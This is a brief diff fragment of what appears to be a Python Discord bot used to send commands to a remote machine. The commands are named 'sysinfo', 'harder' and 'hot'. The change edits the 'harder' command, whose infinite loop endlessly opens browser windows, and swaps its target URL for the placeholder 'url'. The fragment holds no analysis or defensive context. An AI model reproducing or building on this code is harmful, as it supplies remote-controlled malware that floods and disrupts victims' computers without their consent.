@@ -32,7 +32,7 @@ async def sysinfo(ctx):
 async def harder(ctx):
 	await ctx.send("[*] Command sent")
 	while True:
-		webbrowser.open("gay.com")
+		webbrowser.open("url")
 @bot.command()
 async def hot(ctx):
 	await ctx.send("[*] Command sent")
